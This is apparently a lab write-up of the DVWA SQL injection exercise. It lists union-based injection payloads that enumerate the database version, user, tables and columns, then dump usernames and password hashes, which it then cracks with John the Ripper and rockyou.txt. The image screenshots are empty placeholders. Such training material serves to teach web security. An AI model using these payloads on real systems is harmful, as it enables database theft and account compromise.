This challenges allows the user to inject SQL code and we are taking advantage of this to crack the passwords of every users in the database. Most of my knowledge in this challenge comes from <https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson6/index.html> .



Here we show the user n°1:



![](data:image/png;base64,)



We now forge a request that is always True. The requests should looks like:

`… WHERE id=' 1' or '1' = '1 ';`

``

![](data:image/png;base64,)



Version enumeration:

`1' or 1=1 union select null, version() #`

![](data:image/png;base64,)



User enumeration:

`1' or 1=1 union select null, user() #`

![](data:image/png;base64,)



Database name:

`1' and 1=0 union select null, database() #`

(We write "and 1=0" because we don't want to enumerate all the users once again)

![](data:image/png;base64,)



All the tables of the database:

`1' and 1=0 union select null, table_name from information_schema.tables #`

![](data:image/png;base64,)



All the tables containing users:

`1' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%' #`

![](data:image/png;base64,)



We enumerate all columns of the table 'users':

`1' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #`



![](data:image/png;base64,)



And now we enumerate the passwors:

`%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`



![](data:image/png;base64,)



Each password in hashed, so we create a file where each line is "user:hash"



![](data:image/png;base64,)



And we crack it with John the ripper, and the famous wordlist rockyou.txt:



![](data:image/png;base64,)
